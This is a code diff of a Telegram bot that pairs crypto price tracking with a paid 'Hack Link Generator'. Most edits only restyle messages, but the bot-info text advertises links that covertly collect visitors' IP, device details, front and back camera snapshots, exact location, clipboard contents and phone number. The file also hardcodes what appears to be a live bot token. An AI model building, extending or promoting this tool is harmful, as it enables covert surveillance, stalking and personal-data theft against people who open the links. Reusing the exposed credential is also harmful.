@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Advanced Telegram Bot with Crypto Tracking, Hack Link Generator,
-ReCOIN Reward System, Premium Subscription, and Whitelist Auto-Leave.
+🚀 PREMIUM TELEGRAM BOT 🚀
+Crypto Tracker + Hack Link Generator + ReCOIN Reward System + Premium Subscription
 Developer: @EVEL_DEAD0751
-Version: 5.0 – Final Clean
+Version: 6.0 – ULTIMATE PREMIUM
 """
 
 import telebot
@@ -23,7 +23,7 @@ from io import BytesIO
 from apscheduler.schedulers.background import BackgroundScheduler
 
 # =============================================================================
-# CONFIGURATION
+# ⚙️ CONFIGURATION
 # =============================================================================
 BOT_TOKEN = "8616715853:AAGRGBya1TvbSzP2PVDN010-15IK6LVa114"
 OWNER_ID = 6504476778
@@ -33,7 +33,7 @@ bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
 # =============================================================================
-# DATABASE SETUP
+# 🗄️ DATABASE SETUP
 # =============================================================================
 DB_PATH = 'bot.db'
 
@@ -149,13 +149,13 @@ def init_db():
 init_db()
 
 # =============================================================================
-# SCHEDULER
+# ⏰ SCHEDULER
 # =============================================================================
 scheduler = BackgroundScheduler()
 scheduler.start()
 
 # =============================================================================
-# HELPER FUNCTIONS
+# 🛠️ HELPER FUNCTIONS
 # =============================================================================
 def get_binance_price(symbol):
     try:
@@ -246,7 +246,7 @@ def get_active_ad():
         return c.fetchone()
 
 # =============================================================================
-# PRICE ALERTS (background)
+# 🔔 PRICE ALERTS (background)
 # =============================================================================
 def check_alerts():
     with get_db() as conn:
@@ -273,7 +273,7 @@ def check_alerts():
 scheduler.add_job(check_alerts, 'interval', minutes=5)
 
 # =============================================================================
-# ADS EXPIRY (background)
+# 📢 ADS EXPIRY (background)
 # =============================================================================
 def check_expired_ads():
     with get_db() as conn:
@@ -285,7 +285,7 @@ def check_expired_ads():
 scheduler.add_job(check_expired_ads, 'interval', minutes=1)
 
 # =============================================================================
-# LIVE MARKET UPDATES
+# 📈 LIVE MARKET UPDATES
 # =============================================================================
 TOP_COINS = [('BTC', 'bitcoin'), ('ETH', 'ethereum'), ('BNB', 'binancecoin'), ('DOGE', 'dogecoin')]
 
@@ -310,14 +310,18 @@ def get_all_market_data():
 def format_market_message(coins):
     if not coins:
         return "❌ Data unavailable."
-    msg = "📊 *Market Cap*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
+    msg = "╔════════════════════════════╗\n"
+    msg += "║      📊 *MARKET CAP*       ║\n"
+    msg += "╚════════════════════════════╝\n\n"
     for c in coins:
         color = "🟢" if c['change'] >= 0 else "🔴"
         arrow = "▲" if c['change'] >= 0 else "▼"
-        msg += f"{color} *{c['symbol']:<4}*  {format_market_cap(c['market_cap']):>8}  "
-        msg += f"Buy {format_price(c['price']):>8}  {arrow}{abs(c['change']):.2f}%\n\n"
-    msg += "━━━━━━━━━━━━━━━━━━━━━\n"
-    msg += f"⏰ *Last Updated:* {datetime.datetime.now().strftime('%H:%M:%S')} IST"
+        msg += f"{color} *{c['symbol']}*\n"
+        msg += f"   Market Cap: `{format_market_cap(c['market_cap'])}`\n"
+        msg += f"   Price: `{format_price(c['price'])}`\n"
+        msg += f"   24h: `{arrow}{abs(c['change']):.2f}%`\n\n"
+    msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+    msg += f"⏰ *Last Updated:* `{datetime.datetime.now().strftime('%H:%M:%S')} IST`"
     return msg
 
 active_live = {}
@@ -359,7 +363,7 @@ def live_updater():
 threading.Thread(target=live_updater, daemon=True).start()
 
 # =============================================================================
-# WHITELIST AUTO-LEAVE FUNCTIONS
+# 🛡️ WHITELIST AUTO-LEAVE FUNCTIONS
 # =============================================================================
 def is_whitelisted(chat_id):
     with get_db() as conn:
@@ -403,7 +407,7 @@ def is_processed(chat_id):
         return c.fetchone() is not None
 
 # =============================================================================
-# AUTO-LEAVE CHECK
+# 🚪 AUTO-LEAVE CHECK
 # =============================================================================
 @bot.message_handler(func=lambda m: True)
 def auto_leave_check(message):
@@ -424,7 +428,7 @@ def auto_leave_check(message):
             bot.send_message(OWNER_ID, f"⚠️ Failed to leave chat {chat_id}: {e}")
 
 # =============================================================================
-# BOT COMMAND HANDLERS
+# 🤖 BOT COMMAND HANDLERS – PREMIUM UI
 # =============================================================================
 @bot.message_handler(commands=['start'])
 def cmd_start(message):
@@ -435,26 +439,31 @@ def cmd_start(message):
         if message.from_user.id == OWNER_ID:
             c.execute("UPDATE users SET is_paid=1, subscription_end='permanent' WHERE user_id=?", (OWNER_ID,))
         conn.commit()
+    
     welcome = """
-╔══════════════════════╗
-║  *CRYPTO & HACK BOT*  ║
-╚══════════════════════╝
+╔══════════════════════════════════╗
+║     🚀 *CRYPTO & HACK BOT*       ║
+╚══════════════════════════════════╝
 
-🔹 *Crypto Features:*
-• Real-time prices
-• Live market updates
-• Price alerts
-• Charts
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔹 *CRYPTO FEATURES*
+• Real-time prices (BTC/ETH/DOGE)
+• Live market updates (5 sec refresh)
+• Price alerts with notifications
+• 7-day price charts
 • Earn ReCOIN by watching ads
 
-🔹 *Hack Link Features:*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔹 *HACK LINK FEATURES*
 • Generate tracking links
-• Visitor info (IP, device)
-• Premium plans
+• Visitor info (IP, device, browser)
+• Premium plans remove ads
 
-🔹 *Whitelist Auto-Leave:*
-• Automatically leaves non-whitelisted groups/channels
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔹 *WHITELIST AUTO-LEAVE*
+• Automatically leaves non‑whitelisted groups/channels
 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 👇 *Use buttons below*
     """
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
@@ -472,10 +481,10 @@ def crypto_menu(m):
         types.InlineKeyboardButton("💰 ETH", callback_data="eth"),
         types.InlineKeyboardButton("💰 DOGE", callback_data="doge"),
         types.InlineKeyboardButton("📈 Live Market", callback_data="live"),
-        types.InlineKeyboardButton("🔔 Alert", callback_data="alert_menu"),
-        types.InlineKeyboardButton("📊 Chart", callback_data="chart_btc"),
+        types.InlineKeyboardButton("🔔 Set Alert", callback_data="alert_menu"),
+        types.InlineKeyboardButton("📊 7d Chart", callback_data="chart_btc"),
         types.InlineKeyboardButton("🪙 Get ReCOIN", callback_data="getcoin"),
-        types.InlineKeyboardButton("ℹ️ Info", callback_data="bot_info"),
+        types.InlineKeyboardButton("ℹ️ Bot Info", callback_data="bot_info"),
         types.InlineKeyboardButton("💎 Balance", callback_data="balance"),
         types.InlineKeyboardButton("🔙 Back", callback_data="back")
     )
@@ -486,7 +495,7 @@ def hack_menu(m):
     markup = types.InlineKeyboardMarkup(row_width=2)
     markup.add(
         types.InlineKeyboardButton("🔗 Generate Link", callback_data="gen_link"),
-        types.InlineKeyboardButton("📊 History", callback_data="history"),
+        types.InlineKeyboardButton("📊 Log History", callback_data="history"),
         types.InlineKeyboardButton("💎 Subscription", callback_data="sub"),
         types.InlineKeyboardButton("ℹ️ Bot Info", callback_data="bot_info"),
         types.InlineKeyboardButton("🔙 Back", callback_data="back")
@@ -510,8 +519,8 @@ def callback_handler(call):
 ╔══════════════════════╗
 ║    *{coin} PRICE*      ║
 ╠══════════════════════╣
-║  💰 {format_price(data['price'])}          ║
-║  📊 Market Cap: {format_market_cap(data['market_cap'])} ║
+║  💰 `{format_price(data['price'])}`        ║
+║  📊 Market Cap: `{format_market_cap(data['market_cap'])}` ║
 ╚══════════════════════╝
         """
         markup = None
@@ -526,7 +535,7 @@ def callback_handler(call):
 
     # --- Live market ---
     elif call.data == "live":
-        wait = bot.send_message(call.message.chat.id, "⏳ *Fetching market data...*", parse_mode="Markdown")
+        wait = bot.send_message(call.message.chat.id, "⏳ *Fetching live data...*", parse_mode="Markdown")
         coins = get_all_market_data()
         if not coins:
             bot.edit_message_text("❌ Data unavailable", wait.chat.id, wait.message_id)
@@ -584,23 +593,56 @@ def callback_handler(call):
     elif call.data == "getcoin":
         get_coin_command(call.message)
 
-    # --- Bot info ---
+    # --- Bot info (PREMIUM DETAILS) ---
     elif call.data == "bot_info":
         info = """
-🤖 *BOT INFORMATION*
+╔══════════════════════════════════╗
+║        🤖 *BOT INFORMATION*       ║
+╚══════════════════════════════════╝
 
-🔹 *FREE PLAN*
-• IPv4, Device, Browser
-• Screen, Language, Timezone
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔹 *FREE PLAN (Features 1-10)*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+1. IPv4 Address
+2. Battery Percentage
+3. Network Type
+4. Device Info (model, brand)
+5. Platform (Android/iOS)
+6. App Version
+7. User Agent
+8. Screen Resolution
+9. Language & Timezone
+10. Basic Permissions
 
-💎 *PREMIUM (Stars/ReCOIN)*
-• Camera, Location, Clipboard
-• Phone, IPv6, Memory
-• Price alerts, Live market
-• No ads
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💎 *PREMIUM PLAN (Features 11-21)*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+11. IPv6 Address
+12. Front Camera Snapshot
+13. Back Camera Snapshot
+14. Device Memory
+15. Port Number
+16. Bluetooth Information
+17. XR (VR/AR) Info
+18. Complete Location (lat/lon)
+19. Clipboard Data
+20. 📱 Phone Number
+21. Extended Device Info
 
-⭐ *Stars:* 7 (30d), 4 (15d), 1 (1d)
-🪙 *ReCOIN:* 2 = 1d, 14 = 7d, 30 = 15d, 60 = 30d
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⭐ *PREMIUM PRICES*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+• 7 Stars – 30 Days
+• 4 Stars – 15 Days
+• 1 Star – 1 Day
+
+🪙 *ReCOIN PRICES*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+• 2 ReCOIN – 1 Day
+• 14 ReCOIN – 7 Days
+• 30 ReCOIN – 15 Days
+• 60 ReCOIN – 30 Days
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         """
         bot.edit_message_text(info, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
 
@@ -625,7 +667,7 @@ def callback_handler(call):
         verify_ad(call)
 
 # =============================================================================
-# PRICE ALERT COMMAND
+# 🔔 PRICE ALERT COMMAND
 # =============================================================================
 @bot.message_handler(commands=['alert'])
 def alert_command(message):
@@ -660,7 +702,7 @@ def alert_set(call):
     bot.answer_callback_query(call.id, "✅ Alert set!")
 
 # =============================================================================
-# HACK LINK GENERATOR
+# 🔗 HACK LINK GENERATOR
 # =============================================================================
 @bot.message_handler(commands=['terminal:gernatLINK'])
 def gen_link(message):
@@ -720,7 +762,7 @@ def copy_link(call):
         bot.send_message(call.message.chat.id, f"📋 `{row[0]}`", parse_mode="Markdown")
 
 # =============================================================================
-# ReCOIN SYSTEM (Rewarded Ads)
+# 🪙 ReCOIN SYSTEM (Rewarded Ads)
 # =============================================================================
 @bot.message_handler(commands=['getcoin'])
 def get_coin_command(message):
@@ -737,7 +779,22 @@ def get_coin_command(message):
     if not ads:
         bot.reply_to(message, "❌ No rewarded ads right now.")
         return
-    bot.send_message(message.chat.id, f"💰 *Your ReCOIN:* {recoin}\n\n📺 Watch ads to earn more!", parse_mode="Markdown")
+    msg = f"""
+╔══════════════════════╗
+║   🪙 *EARN ReCOIN*    ║
+╚══════════════════════╝
+
+Your Balance: `{recoin} ReCOIN`
+
+━━━━━━━━━━━━━━━━━━━━━
+*How it works:*
+1. Click 👁️ View on any ad
+2. Wait a few seconds
+3. Click ✅ Verify
+4. 2 ads = 1 ReCOIN
+━━━━━━━━━━━━━━━━━━━━━
+    """
+    bot.send_message(message.chat.id, msg, parse_mode="Markdown")
     for ad in ads:
         markup = types.InlineKeyboardMarkup()
         markup.add(
@@ -754,10 +811,12 @@ def verify_ad(call):
     uid = call.from_user.id
     with get_db() as conn:
         c = conn.cursor()
+        # Check if already verified today
         c.execute("SELECT COUNT(*) FROM ad_views WHERE user_id=? AND ad_id=? AND date(viewed_at)=date('now')", (uid, ad_id))
         if c.fetchone()[0] > 0:
             bot.answer_callback_query(call.id, "❌ Already earned today")
             return
+        # Rate limit: 30 seconds between verifications
         c.execute("SELECT viewed_at FROM ad_views WHERE user_id=? ORDER BY viewed_at DESC LIMIT 1", (uid,))
         last = c.fetchone()
         if last:
@@ -765,10 +824,12 @@ def verify_ad(call):
             if datetime.datetime.now() - last_time < datetime.timedelta(seconds=30):
                 bot.answer_callback_query(call.id, "⏳ Wait 30s")
                 return
+        # Daily limit: 10 ads
         c.execute("SELECT COUNT(*) FROM ad_views WHERE user_id=? AND date(viewed_at)=date('now')", (uid,))
         if c.fetchone()[0] >= 10:
             bot.answer_callback_query(call.id, "❌ Daily limit reached")
             return
+        # Record view
         c.execute("INSERT INTO ad_views (user_id, ad_id, viewed_at) VALUES (?,?,?)", (uid, ad_id, datetime.datetime.now()))
         c.execute("SELECT ad_view_count, recoin FROM user_coins WHERE user_id=?", (uid,))
         row = c.fetchone()
@@ -787,7 +848,7 @@ def verify_ad(call):
         conn.commit()
 
 # =============================================================================
-# OWNER ADS MANAGEMENT
+# 👑 OWNER ADS MANAGEMENT
 # =============================================================================
 @bot.message_handler(commands=['createad'])
 def create_ad_start(message):
@@ -850,7 +911,7 @@ def manage_ads(m):
         return
     for ad in ads:
         status = "🟢" if ad['is_active'] else "🔴"
-        text = f"ID:{ad['id']} {status} Views:{ad['views']}\n{ad['button_text']}\nExpires:{ad['expires_at'][:16]}"
+        text = f"ID: {ad['id']} {status} Views: {ad['views']}\n{ad['button_text']}\nExpires: {ad['expires_at'][:16]}"
         markup = types.InlineKeyboardMarkup()
         if ad['is_active']:
             markup.add(types.InlineKeyboardButton("⏹️ Stop", callback_data=f"stopad_{ad['id']}"))
@@ -884,7 +945,7 @@ def delete_ad(call):
     bot.delete_message(call.message.chat.id, call.message.message_id)
 
 # =============================================================================
-# REWARDED ADS MANAGEMENT (for owner)
+# 🎁 REWARDED ADS MANAGEMENT (for owner)
 # =============================================================================
 @bot.message_handler(commands=['createrewardad'])
 def create_reward_ad_start(message):
@@ -941,7 +1002,7 @@ def list_reward_ads(m):
         return
     for ad in ads:
         status = "🟢" if ad['is_active'] else "🔴"
-        text = f"ID:{ad['id']} {status}\n{ad['title']}\n{ad['description']}"
+        text = f"ID: {ad['id']} {status}\n{ad['title']}\n{ad['description']}"
         markup = types.InlineKeyboardMarkup()
         if ad['is_active']:
             markup.add(types.InlineKeyboardButton("🔴 Deactivate", callback_data=f"deact_rad_{ad['id']}"))
@@ -990,7 +1051,7 @@ def delete_reward(call):
     bot.delete_message(call.message.chat.id, call.message.message_id)
 
 # =============================================================================
-# WHITELIST MANAGEMENT COMMANDS (owner only)
+# 📋 WHITELIST MANAGEMENT (owner only)
 # =============================================================================
 @bot.message_handler(commands=['add_whitelist'])
 def add_whitelist_start(message):
@@ -1058,7 +1119,7 @@ def remove_whitelist_callback(call):
     bot.edit_message_text("✅ Removed.", call.message.chat.id, call.message.message_id)
 
 # =============================================================================
-# BALANCE COMMAND
+# 💰 BALANCE COMMAND
 # =============================================================================
 @bot.message_handler(commands=['balance'])
 def balance_cmd(message):
@@ -1074,12 +1135,29 @@ def balance_cmd(message):
         return
     if is_premium(message.from_user.id):
         end = user[1][:10] if user and user[1] else "Unknown"
-        bot.send_message(message.chat.id, f"💎 *PREMIUM*\nValid till: {end}\n💰 ReCOIN: {recoin}", parse_mode="Markdown")
+        msg = f"""
+╔══════════════════════╗
+║   💎 *PREMIUM USER*   ║
+╚══════════════════════╝
+
+📅 Valid till: `{end}`
+💰 ReCOIN: `{recoin}`
+        """
+        bot.send_message(message.chat.id, msg, parse_mode="Markdown")
     else:
-        bot.send_message(message.chat.id, f"🆓 *FREE*\n💰 ReCOIN: {recoin}\n💎 Upgrade: /subscription", parse_mode="Markdown")
+        msg = f"""
+╔══════════════════════╗
+║    🆓 *FREE USER*     ║
+╚══════════════════════╝
+
+💰 ReCOIN: `{recoin}`
+
+💎 Upgrade: /subscription
+        """
+        bot.send_message(message.chat.id, msg, parse_mode="Markdown")
 
 # =============================================================================
-# SUBSCRIPTION (Stars & ReCOIN)
+# 💎 SUBSCRIPTION (Stars & ReCOIN)
 # =============================================================================
 @bot.message_handler(commands=['subscription'])
 def subscription_cmd(message):
@@ -1093,7 +1171,14 @@ def subscription_cmd(message):
         types.InlineKeyboardButton("🪙 30 ReCOIN – 15d", callback_data="recoin_15"),
         types.InlineKeyboardButton("🪙 60 ReCOIN – 30d", callback_data="recoin_30")
     )
-    bot.send_message(message.chat.id, "💎 *PREMIUM PLANS*", parse_mode="Markdown", reply_markup=markup)
+    msg = """
+╔══════════════════════╗
+║   💎 *PREMIUM PLANS*  ║
+╚══════════════════════╝
+
+Choose your plan:
+    """
+    bot.send_message(message.chat.id, msg, parse_mode="Markdown", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('pay_'))
 def stars_pay(call):
@@ -1146,7 +1231,7 @@ def payment_success(message):
     bot.send_message(message.chat.id, f"✅ Premium activated for {days} days!")
 
 # =============================================================================
-# HISTORY
+# 📜 HISTORY
 # =============================================================================
 @bot.message_handler(commands=['log_history'])
 def history_cmd(message):
@@ -1158,13 +1243,15 @@ def history_cmd(message):
     if not rows:
         bot.reply_to(message, "📭 No history")
         return
-    text = "📊 *Your Links*\n"
+    msg = "📊 *Your Recent Links*\n━━━━━━━━━━━━━━━━━━━━━\n"
     for r in rows:
-        text += f"\n🔗 `{r[0]}`\n📝 {r[1][:30]}...\n👥 {r[3]} clicks\n📅 {r[2][:10]}"
-    bot.reply_to(message, text, parse_mode="Markdown")
+        short_url = r[1][:30] + "..." if len(r[1]) > 30 else r[1]
+        msg += f"\n🔗 `{r[0]}`\n📝 {short_url}\n👥 {r[3]} clicks\n📅 {r[2][:10]}\n"
+    msg += "\n━━━━━━━━━━━━━━━━━━━━━"
+    bot.reply_to(message, msg, parse_mode="Markdown")
 
 # =============================================================================
-# FLASK ROUTES (tracking & webhook) – ONLY ONE COPY
+# 🌐 FLASK ROUTES (tracking & webhook)
 # =============================================================================
 @app.route('/')
 def home():
@@ -1210,7 +1297,7 @@ def webhook():
     return 'OK', 200
 
 # =============================================================================
-# BOT STARTUP (webhook)
+# 🚀 BOT STARTUP (webhook)
 # =============================================================================
 def start_bot():
     bot.remove_webhook()
